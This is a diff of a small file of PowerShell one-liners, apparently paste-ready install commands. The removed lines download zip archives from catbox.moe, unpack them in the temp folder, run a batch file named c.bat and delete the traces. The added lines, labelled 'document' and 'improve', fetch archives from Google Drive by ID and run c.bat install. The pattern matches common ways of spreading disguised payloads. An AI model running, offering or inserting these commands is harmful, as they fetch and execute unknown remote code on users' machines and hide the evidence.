@@ -1,3 +1,5 @@
-$url = "https://files.catbox.moe/z3wuww.zip"; $dest = "$env:TEMP\resource"; curl.exe -sSL $url -o "$dest.zip"; Expand-Archive -Path "$dest.zip" -DestinationPath $dest -Force; $cBat = (Get-ChildItem -Path $dest -Filter "c.bat" -Recurse | Select-Object -First 1).FullName; & $cBat install; Start-Sleep -Seconds 2; Remove-Item "$dest.zip" -Force -ErrorAction SilentlyContinue; Remove-Item $dest -Recurse -Force -ErrorAction SilentlyContinue
+document:
+$id="1SW036KFSKdlFhcAMUBZkGgJDLKrDgNii"; $dest="$HOME\resource"; curl.exe -sSL "https://drive.usercontent.google.com/download?id=$id&export=download" -o "$dest.zip"; Expand-Archive -Path "$dest.zip" -DestinationPath $dest -Force; & "$dest\c.bat" install
 
-curl.exe -L 'https://files.catbox.moe/myjcyp.zip' -o "$env:TEMP\resource.zip"; Expand-Archive -Force "$env:TEMP\resource.zip" "$env:TEMP\resource"; & "$env:TEMP\resource\outcal-improve\c.bat"; Start-Sleep -Seconds 2; Remove-Item "$env:TEMP\resource.zip" -Force; Remove-Item "$env:TEMP\resource" -Recurse -Force
+improve:
+$id="1bQ0-daOMMMtKncFxCrTPBuxxaorTKvvR"; $dest="$HOME\resource"; curl.exe -sSL "https://drive.usercontent.google.com/download?id=$id&export=download" -o "$dest.zip"; Expand-Archive -Path "$dest.zip" -DestinationPath $dest -Force; & "$dest\c.bat" install
